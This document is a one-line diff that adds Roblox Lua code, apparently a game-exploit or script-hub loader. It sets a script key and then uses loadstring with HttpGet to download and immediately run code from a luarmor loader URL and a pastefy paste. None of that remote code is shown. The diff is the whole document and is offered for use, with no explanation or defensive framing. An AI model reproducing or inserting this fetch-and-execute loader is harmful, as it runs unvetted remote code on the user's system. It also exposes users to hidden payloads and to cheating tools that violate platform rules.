@@ -1,0 +1,1 @@
+task.spawn(function()script_key="jsannFjLAbqrdAzNwgOerENvUEhbqFmq"loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4109f8447808f89121335990a22ed888.lua"))()end)loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()
